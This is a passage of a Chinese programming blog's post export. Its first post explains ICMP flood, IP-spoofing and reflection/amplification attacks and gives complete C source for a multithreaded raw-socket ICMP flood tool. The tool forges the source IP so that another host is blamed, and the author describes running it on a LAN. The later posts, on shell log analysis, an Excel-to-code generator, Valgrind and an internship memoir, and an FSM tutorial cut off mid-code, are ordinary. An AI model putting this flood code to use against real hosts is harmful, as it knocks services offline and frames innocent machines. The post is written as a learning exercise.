（2）伪IP攻击在直接洪水攻击的基础上，我们将发送方的IP地址伪装成其他IP，如果是伪装成一个随机的IP，那就可以很好地隐藏自己的位置；如果将自己的IP伪装成其他受害者的IP，就会造成“挑拨离间”的情形，受害主机1的icmp回复包也如洪水般发送给受害主机2，如果主机1的管理员要查是哪个混蛋发包攻击自己，他一查ICMP包的源地址，咦原来是主机2，这样子主机2就成了戴罪羔羊了。 （3）反射攻击这类攻击的思想不同于上面两种攻击，反射攻击的设计更为巧妙。其实这里的方式三的攻击模式是前两个模式的合并版以及升级版，方式三的攻击策略有点像“借刀杀人“，反射攻击不再直接对目标主机，而是让其他一群主机误以为目标主机在向他们发送ICMP请求包，然后一群主机向目的主机发送ICMP应答包，造成来自四面八方的洪水淹没目的主机的现象。比如我们向局域网的其他主机发送ICMP请求包，然后自己的IP地址伪装成目的主机的IP，这样子目的主机就成了ICMP回显的焦点了。这种攻击非常隐蔽，因为受害主机很难查出攻击源是谁。 二、ICMP洪水攻击程序设计这里我想实现一个ICMP洪水攻击的例子，这里我想采用方式二来进行设计。虽说方式三的“借刀杀人”更为巧妙，其实也是由方式二的伪装方式进一步延伸的，实现起来也是大同小异。 首先给出攻击的模型图： 1.组ICMP包这里的组包跟编写PING程序时的组包没太大差别，唯一需要注意的是，我们需要填写IP头部分，因为我们要伪装源地址，做到嫁祸于人。 123456789101112131415161718192021void DoS_icmp_pack(char* packet){ struct ip* ip_hdr = (struct ip*)packet; struct icmp* icmp_hdr = (struct icmp*)(packet + sizeof(struct ip)); ip_hdr-&gt;ip_v = 4; ip_hdr-&gt;ip_hl = 5; ip_hdr-&gt;ip_tos = 0; ip_hdr-&gt;ip_len = htons(ICMP_PACKET_SIZE); ip_hdr-&gt;ip_id = htons(getpid()); ip_hdr-&gt;ip_off = 0; ip_hdr-&gt;ip_ttl = 64; ip_hdr-&gt;ip_p = PROTO_ICMP; ip_hdr-&gt;ip_sum = 0; ip_hdr-&gt;ip_src.s_addr = inet_addr(FAKE_IP);; //伪装源地址 ip_hdr-&gt;ip_dst.s_addr = dest; //填入要攻击的目的主机地址 icmp_hdr-&gt;icmp_type = ICMP_ECHO; icmp_hdr-&gt;icmp_code = 0; icmp_hdr-&gt;icmp_cksum = htons(~(ICMP_ECHO &lt;&lt; 8));//注意这里，因为数据部分为0，我们就简化了一下checksum的计算了} 2.搭建发包线程123456789101112131415161718void Dos_Attack(){ char* packet = (char*)malloc(ICMP_PACKET_SIZE); memset(packet, 0, ICMP_PACKET_SIZE); struct sockaddr_in to; DoS_icmp_pack(packet); to.sin_family = AF_INET; to.sin_addr.s_addr = dest; to.sin_port = htons(0); while(alive) //控制发包的全局变量 { sendto(rawsock, packet, ICMP_PACKET_SIZE, 0, (struct sockaddr*)&amp;to, sizeof(struct sockaddr)); } free(packet); //记得要释放内存} 3.编写发包开关这里的开关很简单，用信号量+全局变量即可以实现。当我们按下ctrl+c时，攻击将关闭。 12345void Dos_Sig(){ alive = 0; printf(&quot;stop DoS Attack!\\n&quot;);} 4.总的架构我们使用了64个线程一起发包，当然这个线程数还可以大大增加，来增加攻击强度。但我们只是做做实验，没必要搞那么大。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273int main(int argc, char* argv[]){ struct hostent* host = NULL; struct protoent* protocol = NULL; int i; alive = 1; pthread_t attack_thread[THREAD_MAX_NUM]; //开64个线程同时发包 int err = 0; if(argc &lt; 2) { printf(&quot;Invalid input!\\n&quot;); return -1; } signal(SIGINT, Dos_Sig); protocol = getprotobyname(PROTO_NAME); if(protocol == NULL) { printf(&quot;Fail to getprotobyname!\\n&quot;); return -1; } PROTO_ICMP = protocol-&gt;p_proto; dest = inet_addr(argv[1]); if(dest == INADDR_NONE) { host = gethostbyname(argv[1]); if(host == NULL) { printf(&quot;Invalid IP or Domain name!\\n&quot;); return -1; } memcpy((char*)&amp;dest, host-&gt;h_addr, host-&gt;h_length); } rawsock = socket(AF_INET, SOCK_RAW, PROTO_ICMP); if(rawsock &lt; 0) { printf(&quot;Fait to create socket!\\n&quot;); return -1; } setsockopt(rawsock, SOL_IP, IP_HDRINCL, &quot;1&quot;, sizeof(&quot;1&quot;)); printf(&quot;ICMP FLOOD ATTACK START\\n&quot;); for(i=0;i&lt;THREAD_MAX_NUM;i++) { err = pthread_create(&amp;(attack_thread[i]), NULL, (void*)Dos_Attack, NULL); if(err) { printf(&quot;Fail to create thread, err %d, thread id : %d\\n&quot;,err, attack_thread[i]); } } for(i=0;i&lt;THREAD_MAX_NUM;i++) { pthread_join(attack_thread[i], NULL); //等待线程结束 } printf(&quot;ICMP ATTACK FINISHI!\\n&quot;); close(rawsock); return 0;} 三、实验本次实验本着学习的目的，想利用自己手上的设备，想进一步理解网络和协议的应用，所以攻击的幅度比较小，时间也就几秒，不对任何设备造成影响。 再说一下我们的攻击步骤：我们使用主机172.0.5.183作为自己的攻击主机，并将自己伪装成主机172.0.5.182，对主机172.0.5.9发起ICMP洪水攻击。 攻击开始 我们观察一下”受害者“那边的情况。在短短5秒里，正确收到并交付上层处理的包也高达7万多个了。我也不敢多搞事，避免影响机器工作。 使用wireshark抓包再瞧一瞧，满满的ICMP包啊，看来量也是很大的。ICMP包的源地址显示为172.0.5.182（我们伪装的地址），它也把echo reply回给了172.0.5.182。主机172.0.5.182肯定会想，莫名其妙啊，怎么收到这么多echo reply包。 攻击实验做完了。 现在更为流行的是DDOS攻击，其威力更为强悍，策略更为精巧，防御难度也更加高。其实，这种DDoS攻击也是在DOS的基础上发起的，具体步骤如下： 攻击者向“放大网络”广播echo request报文 攻击者指定广播报文的源IP为被攻击主机 “放大网络”回复echo reply给被攻击主机 形成DDoS攻击场景 这里的“放大网络”可以理解为具有很多主机的网络，这些主机的操作系统需要支持对目的地址为广播地址的某种ICMP请求数据包进行响应。 攻击策略很精妙，简而言之，就是将源地址伪装成攻击主机的IP，然后发广播的给所有主机，主机们收到该echo request后集体向攻击主机回包，造成群起而攻之的情景。","link":"/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/"},{"title":"shell日志数据分析实战","text":"shell 脚本在日志扫档中用的比较多，脚本使用的熟练程度能极大地影响你的工作效率，比如某一天我的领导叫我帮忙扫一下日志，把一些关键的数据扫出来，当时因为自己对shell不是很熟练再加上日志格式比较复杂，自己花了一个下午才把数据给整出来，当时也特别烦躁，因为明知这是一个很简单的任务，但因为自己对工具（脚本）的不熟练，导致这个领导看起来无关痛痒的小需求（确实也是很简单）却占用了自己很多的工作时间，把我原先的工作给耽误了，搞到我当天加班到很晚才把当天的工作完成，当时就认识到服务器开发中shell脚本的熟练掌握非常重要。 日常数据收集和分析中shell脚本用的最多的指令就是这几个：grep, awk, sed, sort, uniq, xargs,wc,head,tail。个人认为这9个指令可以解决我们平时90%的数据分析任务，实在有些复杂的功能，那就需要写一写shell脚本，所以还得熟悉一下shell语法的for,if else,读写文件就足够了。 以下以2个实际的数据归档的案例，串联起上面提到的所有shell 指令，把他们的重要的使用场景和方法实践。 任务1：2020年11月25日8点以来login次数前20的玩家日志格式如下： 123456[2020-12-05 19:21:37][6772100] logout[2020-12-05 19:22:18][6797297] login[2020-12-05 19:22:50][6770758] login[2020-12-05 19:24:46][6796204] relogin[2020-12-05 19:24:48][6770256] login[2020-12-05 19:25:34][6796204] relogin 实现思路： 筛选登录: grep 筛选时间：awk 的 if 排序前20：sort 实现步骤： 我比较喜欢用Sed先整理格式，即把分割符统一替换成空格： sed -e 's/\\[/ /g' -e 's/\\]/ /g' login.dat 输出： 123452020-12-05 19:39:47 6771096 login2020-12-05 19:42:33 6769079 logout2020-12-05 19:42:33 6769162 logout2020-12-05 19:43:13 6798402 relogin 筛选登录用grep： sed -e 's/\\[/ /g' -e 's/\\]/ /g' login.dat |grep -w login 输出 1234562020-12-05 19:14:53 6772163 login2020-12-05 19:18:24 6796958 login2020-12-05 19:18:27 6798402 login2020-12-05 19:39:47 6771096 login2020-12-05 19:46:19 6769423 login 筛选时间用awk: sed -e 's/\\[/ /g' -e 's/\\]/ /g' login.dat |grep -w login | awk '{if($1&quot; &quot;$2&gt; &quot;2020-11-25 08:00:00&quot;) print $3}' 注意，$变量之间用””就可以把他们转化为字符串连接在一起，如果要转整形需使用”+” 输出 12345678910111213141516676852467971246797435679547267684356769433679712367702536772163679695867984026797297677075867702566798284 排序+计数用sort+uniq: sed -e 's/\\[/ /g' -e 's/\\]/ /g' login.dat |grep -w login | awk '{if($1&quot; &quot;$2&gt; &quot;2020-11-25 08:00:00&quot;) print $3}' | sort | uniq -c |sort 注意sort后再接uniq 统计重复行才能统计出来，最后再接sort排序 123456789101112131411 679676511 679782112 676945112 676946412 679636512 679676112 679676213 679823814 679676315 676656022 679843323 676891137 6806225 取前20用tail：sed -e 's/\\[/ /g' -e 's/\\]/ /g' login.dat |grep -w login | awk '{if($1&quot; &quot;$2&gt; &quot;2020-11-25 08:00:00&quot;) print $3}' | sort | uniq -c |sort |tail -n 20 |awk '{print $2}'得到最后结果 输出 12345678910111213141516171819202167986156767256676936767696846796775679782067693876796765679782167694516769464679636567967616796762679823867967636766560679843367689116806225 任务2：输出2020年11月25日8点以来login次数前20的玩家具体的参与活动的具体情况，格式按usernum 总分数输出这里涉及到两个文件的数据合并，文件1就是上一个任务的最终结果，文件2的格式如下： 1234567891011121314[2020-12-05 18:55:25] [party]desc=finish_game,uid=6772009,game=1,score=1168, count=64[2020-12-05 18:56:02] [party]desc=finish_game,uid=6772009,game=1,score=1680, count=128[2020-12-05 18:56:40] [party]desc=finish_game,uid=6772009,game=2,score=120, count=12[2020-12-05 18:57:34] [party]desc=finish_game,uid=6772009,game=2,score=240, count=24[2020-12-05 18:58:53] [party]desc=finish_game,uid=6772009,game=3,score=120, count=12[2020-12-05 21:38:23] [party]desc=finish_game,uid=6795956,game=5,score=780, count=50[2020-12-05 21:38:54] [party]desc=finish_game,uid=6795956,game=4,score=60, count=60[2020-12-05 21:40:27] [party]desc=finish_game,uid=6795956,game=2,score=300, count=30[2020-12-05 21:42:10] [party]desc=finish_game,uid=6766739,game=5,score=830, count=68[2020-12-05 21:43:11] [party]desc=finish_game,uid=6766739,game=1,score=1888, count=128[2020-12-05 21:43:54] [party]desc=finish_game,uid=6766739,game=2,score=170, count=17[2020-12-05 21:45:27] [party]desc=finish_game,uid=6766739,game=3,score=150, count=15[2020-12-05 21:46:20] [party]desc=finish_game,uid=6766739,game=2,score=120, count=12 思路： grep出关键信息，做好格式化 累计计算玩家的所有的分数 找出文件1的uid在文件2中的分数 实现步骤： grep出关键信息，通过awk做好格式化：grep finish_game znq20.dat | awk -F ',' '{print $2,$4}' 输出： 123456789101112131415uid=6772005 score=40uid=6772005 score=120uid=6772005 score=110uid=6772005 score=500uid=6772007 score=1608uid=6772007 score=230uid=6772007 score=110uid=6772007 score=550uid=6772007 score=280uid=6772008 score=1560uid=6772008 score=240uid=6772008 score=210uid=6772008 score=140uid=6772008 score=430 继续使用awk继续分割，继续格式化，输出【uid 分数】的格式：grep finish_game znq20.dat | awk -F ',' '{print $2,$4}' | awk -F '[= ]' '{print $2,$4}' 输出： 123456789101112136772008 1406772008 4306772009 11686772009 16806772009 1206772009 2406772009 1206795956 7806795956 606795956 3006766739 8306766739 18886766739 170 统计每个用户的游戏总分数，使用awk中的字典实现，用END流程控制，最后输出结果：1grep finish_game znq20.dat | awk -F ',' '{print $2,$4}' | awk -F '[= ]' '{print $2,$4}' | awk '{map[$1]+=$2} END{for(k in map) print k,map[k]}' 输出：1234567891011126797415 3106795471 31086798595 17356797867 508566767900 52696767695 2006772097 62466797801 5706768636 18976769367 1212066795865 2580 上一步的结果已经输出到文件，现在cat practice*.txt就会输出AB文件的内容，因为A文件每行只有一列，B文件每行2列,因此用awk 的NF区分这是A文件的数据还是B文件数据。再判断A文件的UID是否在B文件，有则输出B文件对应的行：1cat practice*.txt | awk '{if(NF==1) map1[$1]=1; else map2[$1]=$2} END{for(k in map1) if(map2[k]&gt;0) print k,map2[k]}' 输出：123456769451 11356798433 12306769367 1212066806225 9901 总结日志数据过滤分析中重度依赖awk和grep,而sed,wc,sort,uniq等也有比较多的使用场景，因此着重掌握awk和grep尤为重要。这是这些指令的使用场景： awk：格式化输出，按列分割，按列打印，使用if,for,begin,end做流程控制，用关联内置的关联数组做数据的记录和计算，还有一些常用的内置额字符串相关的函数需要记牢：match(s,r)，index(s,t)，length(s) ，substr(s,p,n) grep：用于数据过滤，掌握一些参数即可，比如-v，-w, -c, -i, -r, -n,-A,-B,-C sed: 用于替换，重度使用这个：sed 's/替换前的值/替换后的值/g' sort: 排序，掌握-f,-r,-n,-k(按自己需要选择哪一列的key进行排序，很有用,如-k2就是使用第2列进行排序) uniq: 去重，一般都是结合sort使用，先sort再uniq -c wc: 统计行数, wc -l即可","link":"/2020/12/06/shell%E6%97%A5%E5%BF%97%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"},{"title":"excel转代码的编表脚本xls2code","text":"游戏行业中，策划的主力输出工具是excel，他们需要在一张张excel中不断填写和修改数据，因为游戏行业的多变性，因此策划需要经常反复地对一个系列数据进行修改，然后再到游戏里观察效果，再不断地作出调整。而这些excel表的修改反映到游戏里就是一个个功能点的调整，在游戏程序员看来，他们修改的是游戏程序里的参数和配置。因此，为了适应策划善变的想法，游戏开发中需要一个自动化编表工具，自动将一张张excel表转化为代码，做到自动化更新代码配置，而无需程序员主动参与。这就释放了游戏程序开发者的双手，让策划承担了一部分游戏开发者的工作，提升了整体游戏开发的效率。 要做这么一个编表工具，基本都是从以下几点出发来设计： 与策划沟通excel的数据格式 设计自己的代码模板template 将excel表的数据读入内存 按照指定的格式解析数据 将解析后的数据按照代码模板生成出目标代码文件 这里以excel文件转python代码的实践作为例子，解析编表过程。总体来讲，使用Python + jinja2库，就能实现一套通用的编表脚本。 excel转python文件1. 填excel表，保存为后缀名为.xls文件首先需要跟策划商量需求，他们打算需要什么数据，而这些数据到最后又该以什么形式呈现在代码里。格式如下，一行为一条数据，首列是该行数据的唯一ID。 2. 在.xls里建立CONFIG表，配置相关编表信息在excel文件里新建一个CONFIG表，作为这个excel文件的数据解析schema。我们在这个SHEET里，定义好输入的Excel文件路径、输出文件路径、代码模板路径以及excel中每一列的数据定义。 3. 填写template代码模板填写template代码模板，需要借助jinja2来完成代码的生成，该模板需要放在template文件夹内。一般而言，如果你的编程语言是Python，那我们就把excel数据转化为字典来存储，此时需要保证key要唯一，这里的key对用也就是excel表中的第一列，一般都定义为唯一ID。 12345678910111213141516171819202122################## 以下是自动生成的代码 #################### 比赛系统 lijunshi2015@163.comTimeConf = { {% for v in content.list %}{{v.id}} : { &quot;season_name&quot; : &quot;{{v.season_name}}&quot;, &quot;release_start&quot; : &quot;{{v.release_start}}&quot;, &quot;release_end&quot; : &quot;{{v.release_end}}&quot;, &quot;exchange_end&quot; : &quot;{{v.exchange_end}}&quot;, &quot;turnplate_id&quot; : {{v.turnplate_id}},},{% endfor %}}def get_conf(): return TimeConf;################## 以上是自动生成的代码 #################################### 以下是手工编写部分 ################## 4. 运行自动编表脚本，参数传入的是要处理的xls文件1python3 xls2code.py ./xls/game_season.xls 5. 最后会自动生成配置代码，放在auto_codes文件夹内12345678910111213141516171819202122232425262728293031################## 以下是自动生成的代码 #################### 比赛系统 lijunshi2015@163.comTimeConf = { 2101 : { &quot;season_name&quot; : &quot;2021年第一赛季&quot;, &quot;release_start&quot; : &quot;2021-03-09 08:00:00&quot;, &quot;release_end&quot; : &quot;2021-05-09 24:00:00&quot;, &quot;exchange_end&quot; : &quot;2021-05-11 08:00:00&quot;, &quot;turnplate_id&quot; : 21013001,},2102 : { &quot;season_name&quot; : &quot;2021年第二赛季&quot;, &quot;release_start&quot; : &quot;2021-05-11 08:00:00&quot;, &quot;release_end&quot; : &quot;2021-07-11 24:00:00&quot;, &quot;exchange_end&quot; : &quot;2021-07-13 08:00:00&quot;, &quot;turnplate_id&quot; : 21023001,},}def get_conf(): return TimeConf;################## 以上是自动生成的代码 #################################### 以下是手工编写部分 ################## 6. 自己的业务代码调用配置代码，例子是demo_main.py1234import auto_codes.game_time_conf as time_confconf_time = time_conf.get_conf()print(conf_time) excel转cpp文件的步骤编表工具理论上可以通过xls生成任何语言的代码，关键在于配置编写指定语言的template，比如我们这次要通过excel表生成C++的头文件，方便被引用，可以参考xls/game_season_cpp.xls和模板template/game_timne_cpp.template.使用xls2code.py脚本编出代码文件game_time_conf.h，最后再被业务文件include调用。请参考demo_main.cpp。 使用的cpp模板如下，思路也是使用std::map将Excel数据转过来，再通过业务代码引用来使用。 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;string&gt;// ################## 以下是自动生成的代码 ##################// ## 比赛系统 lijunshi2015@163.comstatic std::map&lt;int, std::map&lt;std::string, std::string&gt; &gt; time_conf = { {% for v in content.list %} { {{v.id}} , { {&quot;season_name&quot; , &quot;{{v.season_name}}&quot; } , {&quot;release_start&quot; , &quot;{{v.release_start}}&quot; } , {&quot;release_end&quot; , &quot;{{v.release_end}}&quot; } , {&quot;exchange_end&quot; , &quot;{{v.exchange_end}}&quot; } , {&quot;turnplate_id&quot; , &quot;{{v.turnplate_id}}&quot; } , } },{% endfor %}};std::map&lt;int, std::map&lt;std::string, std::string&gt; &gt; get_conf(){ return time_conf;}// ################## 以上是自动生成的代码 ##################// ################## 以下是手工编写部分 ################## 业务代码调用数据配置文件的实例。 123456789101112131415#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;stdio.h&gt;#include &quot;auto_codes/game_time_conf.h&quot;using namespace std;int main(){ std::map&lt;int, std::map&lt;string, string&gt; &gt; my_conf = get_conf(); printf(&quot;%s\\n&quot;, my_conf[2101][&quot;season_name&quot;].c_str()); printf(&quot;%s\\n&quot;, my_conf[2102][&quot;release_start&quot;].c_str()); return 0;} 项目路径：https://github.com/AstarLight/xls2code","link":"/2021/04/15/excel%E8%BD%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E7%BC%96%E8%A1%A8%E8%84%9A%E6%9C%ACxls2code/"},{"title":"内存问题检测神器：Valgrind","text":"在写大型C/C++工程时难免会发生内存泄漏现象，系统编程中一个重要的方面就是有效地处理与内存相关的问题。你的工作越接近系统，你就需要面对越多的内存问题。有时这些问题非常琐碎，而更多时候它会演变成一个调试内存问题的恶梦。 常见的内存问题一共七种： 动态内存泄露； 资源泄露，比如文件指针不关闭； 动态内存越界； 数组内存越界； 动态内存double free； 使用野指针，即未初始化的指针； 释放野指针，即未初始化的指针。 内存问题非常难定位，对于小工程来说，简单去检查代码中new和delete的匹配对数就基本能定位到问题，但是一旦代码量上升到以万单位时，仅靠肉眼检查来定位问题那就非常困难了，所以我们需要利用工具帮助我们找出问题所在。在Linux系统下内存检测工具首推Valgrind，一款非常好用的开源内存管理框架。Valgrind其实是一个工具集，内存错误检测只是它众多功能的一个，但我们用得最多的功能正是它——memcheck。 该工具可以检测下列与内存相关的问题 : 未释放内存的使用 对释放后内存的读/写 对已分配内存块尾部的读/写 内存泄露 不匹配的使用malloc/new/new[] 和 free/delete/delete[] 重复释放内存 首先安装Valgrind非常简单： 123456789//valgrind下载：http://valgrind.org/downloads/valgrind-3.12.0.tar.bz2valgrind安装：1. tar -jxvf valgrind-3.12.0.tar.bz22. cd valgrind-3.12.03. ./configure4. make5. sudo make install 下面开始讲解Valgrind的应用场景。 注意: 下面讨论的所有测试代码都应该使用gcc/g++并且加上-g选项。 1. 使用未初始化的内存（使用野指针）这里我们定义了一个指针p，但并未给他开辟空间，即他是一个野指针，但我们却使用它了。 Valgrind检测出我们程序使用了未初始化的变量，但并未检测出内存泄漏。 2.在内存被释放后进行读/写（使用野指针）p所指向的内存被释放了，p变成了野指针，但是我们却继续使用这片内存。 Valgrind检测出我们使用了已经free掉的内存，并给出这片内存是哪里分配哪里释放的。 3.从已分配内存块的尾部进行读/写（动态内存越界）我们动态地分配了一段数组，但我们在访问个数组时发生了越界读写，程序crash掉。 Valgrind检测出越界的位置。 注意：Valgrind不检查静态分配数组的使用情况！所以对静态分配的数组，Valgrind表示无能为力！比如下面的例子，程序crash掉，我们却不知道为什么。 4.内存泄漏内存泄漏的原因在于没有成对地使用malloc/free和new/delete，比如下面的例子。 Valgrind会给出程序中malloc和free的出现次数以判断是否发生内存泄漏，比如对上面的程序运行memcheck，Valgrind的记录显示上面的程序用了1次malloc，却调用了0次free，明显发生了内存泄漏！ 上面提示了我们可以使用–leak-check=full进一步获取内存泄漏的信息，比如malloc和free的具体行号。 5. 不匹配地使用malloc/new/new[] 和 free/delete/delete[]正常使用new/delete和malloc/free是这样子的： 而不匹配地使用malloc/new/new[] 和 free/delete/delete[]则会被提示mismacth： 6.两次释放内存double free的情况同样是根据malloc/free的匹配对数来体现的，比如free多了一次，Valgrind也会提示。 当然，Valgrind也不是万能的。Valgrind也有无法找到问题的时候，有些问题只能通过不断的review代码找到了症结。发现问题，解决问题，毕竟是末流。最好的方法，就是不引入内存问题。这可以通过良好的代码风格和设计来实现的。","link":"/2018/04/13/%E5%86%85%E5%AD%98%E9%97%AE%E9%A2%98%E6%A3%80%E6%B5%8B%E7%A5%9E%E5%99%A8%EF%BC%9AValgrind/"},{"title":"我在北京实习的四个月","text":"今天终于要离开北京了，正式结束在Intel的实习生旅程。现在在首都机场写下这4个月来在北京生活、在Intel实习的一些见闻和感悟。 在Intel的实习4月初的时候拿到了Intel的实习机会，当时还是非常兴奋的，因为毕竟Intel作为世界顶级科技公司，有机会去里面当软件工程师实习生还是一段很有意思的经历。当然四个月下来，确实收获很多。我参与项目组是Intel Sports Group，项目做的主要是利用计算机视觉来做体育直播视频的分析（比如球、运动员的检测和跟踪，精彩时刻的识别等）、三维重建，让观看体育直播的观众们能够身临其境般地体验到比赛场地上的各种场景。我加入是system team，做的是怎么将各种Deep Learning算法模块组合成一个高吞吐、低延迟的高性能分布式系统，所以我们team做的就是怎么设计和搭建这种AI System。当时实习找的方向也是Computer Vision System方向的一些实习，因为研一时期一整年都在做计算机视觉偏算法层面的工作，负责了我们学校票据识别系统的核心识别算法的研究和系统的搭建，虽然系统在功能上是OK了，但是从系统层面考虑上，却欠缺比较宏观的思考和设计，总的而言这个系统太学生气，在稳定性、扩展性和性能方面都非常差。所以我在找实习时找的方向就是AI System方向的，希望到大公司看看他们要设计一个工业级的AI System会采取什么思路和技术。最后找到这么一个实习还是跟我的方向非常macth，这真是太幸运了。 在Intel当实习生还是非常幸福，公司对实习生还是比较重视，至少在给了我们这群实习生比较大的操作空间，比如源码对实习生全部开放，我们系统组的也可去看看算法组的代码实现，除此之外实习生一般都会被安排做一些探索性的工作，我在项目组负责的任务主要是一个新的任务调度框架（super-service）的实现、NFL新的pinelining探索、想方设法让整个系统做到实时。4个月来，60+次commit和和6000+行代码，证明了我这段实习经历并没有太划水，现在最希望的是能有朝一日在电视看到我们项目组的产品，这样子我写的代码才真正赋予了价值。 Intel的工作比较宽松，不需要打卡，每天把自己的工作做好就行了，因为大家都很自觉，所以这边没有加班氛围。我在所在的机构是英特尔中国研究中心，就我们项目组而言，大家的学历背景都相当高，基本都是985硕士起步，博士也很多，当然最多的还是清北人，比如我的导师，就是清华毕业的大佬，性格又平易近人，平时跟他讨论方案时感觉思路都快赶不上了，老是叫他能不能再解释一遍。我导师真是一个非常厉害的人，有时还跟我们说他当年和楼教主的在TopCoder上PK抢分的往事，听得我一晃一晃的。 外企很注意流程和规范，我们组的风格也是如此。我在这边确实接触到了很多工业界做产品开发的一些常用工具，GitHub做代码仓库（到这儿我才发现，原来企业也用GitHub），微服想，容器技术，用K8S做容器调度，pipelining做加速，Redis的使用，GFS，map-reduce。很多很多相关的技术，我都觉得可以运用到我的票据识别系统上，至少知道，要优化一个系统，怎么让他做大做强有哪些常用的思路可以尝试，回到学校后还是要好好继续设计我的票据识别系统，做成一个高性能的通用大规模OCR分布式系统。 在北京的生活在北京呆了4个月了，除了在公司实习，剩下是时间就是生活啦。很高兴在住的地方遇到了一群优秀、好玩的小伙伴们，让我在北京的4个月没有感到孤独。来北京之后最大的感触就是，北京真是一个聚集各种人才的地方，大家喜欢从四面八方来到中国最繁华的地方需求工作学习的机会。在住的地方遇到了有太多太优秀的人才了，清北的，斯坦福的，UCL的，密歇根的，即使没有名校毕业的背景小伙伴，在其他方面都有很强的能力。他们都有很强的目标性，知道自己将来要做些什么，现在又该做哪些准备，比如有个大二学生就跑过来北京实习刷经历了。在这么多人交往中有两个小发现，第一个小发现是，来北京实习或者找工作的海外留学生很多。第二个小发现就是大家都喜欢追逐高学历，至少硕士，但大多数人还是计划读博，尤其是女生，这个比例更大。因为身边的想读博小伙伴们太多，使得我一度也花了一段时间思考我自己到底喜不喜欢科研，适不适合读博。 作为一个南方人，初来北京真的很不习惯，第一是空气，北京的空气真的非常差，雾霾严重，鼻子刚来的时候会很酸，但是后来习惯就好了。还有就是北京比广州干燥，因此我来北京不久手心就开始掉皮了。第二是饮食，北京的后吃的东西与广州相比真的少太多了，这边吃的东西都是偏咸，而且这边也没有吃青菜的习惯。第三是交通，因为北京是不禁摩的，所以路面上车多复杂，各类型的车各种穿梭，尤其是在人行横道绿灯过马路时，我们行人还要小心自己右边可能还会有小车左转冲出来跟你抢位置，在广州的话，这种情况就不会发生啦，因为广州的十字路口基本都带转向红绿灯。以上就是我在北京生活4个月的一些小小的感受。说到底，还是觉得我们大广东适合我生活：） 溜了溜了时间过得真的非常快，想不到今天就要离开北京了，心里有点复杂，既有学有所成返回家乡的兴奋，也有难舍小伙伴的伤感。我第一天来北京的情景还历历在目：拖着行李箱，一出机场看到满天的飞絮，我心头不禁一愣，怎么北京飘着这玩意啊？天天飘着这个还怎么生活啊！后面才知道这叫做飘絮，北方每到这时分就会满城飘絮。今天是离开之日却是秋高气爽，阳光明媚，蓝天白云，清风徐来还有点凉意，估计是秋天的感觉吧。 在北京Intel实习的日子里，眼界开阔了很多，见到了太多优秀且谦逊的人，也看到了自己与别人的差距，从与他们的交谈中可以很清楚的看到，自己的眼界真的是太低太低了。研究生明年就要毕业了，家里人读书不多，想法都很简单，不求大富大贵，希望孩子找一些事业单位公务员什么的稳稳定定生活就好。自己作为可能有能力改变家庭命运的第一代人，自己的想法还有很多，私企？国企？外企？公务员？还有最近去了北京才萌生的读博念头，现在貌似每条路都有很好的机会，每条路都是很好的选择，自己现在的想法还是，把技术做到极致，专注技术才能让我每天过得开心和踏实。最后上一张在公司拍的一张照片，一眼望去，真是美极了。","link":"/2018/09/09/%E6%88%91%E5%9C%A8%E5%8C%97%E4%BA%AC%E5%AE%9E%E4%B9%A0%E7%9A%84%E5%9B%9B%E4%B8%AA%E6%9C%88/"},{"title":"有限状态机FSM的理解与实现","text":"有限状态机（finite state machine）简称FSM，表示有限个状态及在这些状态之间的转移和动作等行为的数学模型，在计算机领域有着广泛的应用。FSM是一种逻辑单元内部的一种高效编程方法，在服务器编程中，服务器可以根据不同状态或者消息类型进行相应的处理逻辑，使得程序逻辑清晰易懂。 那有限状态机通常在什么地方被用到？ 处理程序语言或者自然语言的 tokenizer,自底向上解析语法的parser，各种通信协议发送方和接受方传递数据对消息处理，游戏AI等都有应用场景。 状态机有以下几种实现方法，我将一一阐述它们的优缺点。 一、使用if/else if语句实现的FSM使用if/else if语句是实现的FSM最简单最易懂的方法，我们只需要通过大量的if /else if语句来判断状态值来执行相应的逻辑处理。 看看下面的例子，我们使用了大量的if/else if语句实现了一个简单的状态机，做到了根据状态的不同执行相应的操作，并且实现了状态的跳转。 1234567891011121314151617181920212223242526272829303132333435363738394041424344//比如我们定义了小明一天的状态如下enum{ GET_UP, GO_TO_SCHOOL, HAVE_LUNCH, GO_HOME, DO_HOMEWORK, SLEEP,};int main(){ int state = GET_UP; //小明的一天 while (1) { if (state == GET_UP) { GetUp(); //具体调用的函数 state = GO_TO_SCHOOL; //状态的转移 } else if (state == GO_TO_SCHOOL) { Go2School(); state = HAVE_LUNCH; } else if (state == HAVE_LUNCH) { HaveLunch(); } ... else if (state == SLEEP) { Go2Bed(); state = GET_UP; } } return 0;} 看完上面的例子，大家有什么感受？是不是感觉程序虽然简单易懂，但是使用了大量的if判断语句，使得代码很低端，同时代码膨胀的比较厉害。这个状态机的状态仅有几个，代码膨胀并不明显，但是如果我们需要处理的状态有数十个的话，该状态机的代码就不好读了。 二、使用switch实现FSM使用switch语句实现的FSM的结构变得更为清晰了，其缺点也是明显的：这种设计方法虽然简单，通过一大堆判断来处理，适合小规模的状态切换流程，但如果规模扩大难以扩展和维护。 123456789101112131415161718192021222324252627282930int main(){ int state = GET_UP; //小明的一天 while (1) { switch(state) { case GET_UP: GetUp(); //具体调用的函数 state = GO_TO_SCHOOL; //状态的转移 break; case GO_TO_SCHOOL: Go2School(); state = HAVE_LUNCH; break; case HAVE_LUNCH: HaveLunch(); state = GO_HOME; break; ... default: break; } } return 0;} 三、使用函数指针实现FSM使用函数指针实现FSM的思路：建立相应的状态表和动作查询表，根据状态表、事件、动作表定位相应的动作处理函数，执行完成后再进行状态的切换。 当然使用函数指针实现的FSM的过程还是比较费时费力，但是这一切都是值得的，因为当你的程序规模大时候，基于这种表结构的状态机，维护程序起来也是得心应手。 下面给出一个使用函数指针实现的FSM的框架： 我们还是以“小明的一天”为例设计出该FSM。 先给出该FSM的状态转移图： 下面讲解关键部分代码实现 首先我们定义出小明一天的活动状态 123456789//比如我们定义了小明一天的状态如下enum{ GET_UP, GO_TO_SCHOOL, HAVE_LUNCH, DO_HOMEWORK, SLEEP,}; 我们也定义出会发生的事件 123456enum{ EVENT1 = 1, EVENT2, EVENT3,}; 定义状态表的数据结构 1234567typedef struct FsmTable_s{ 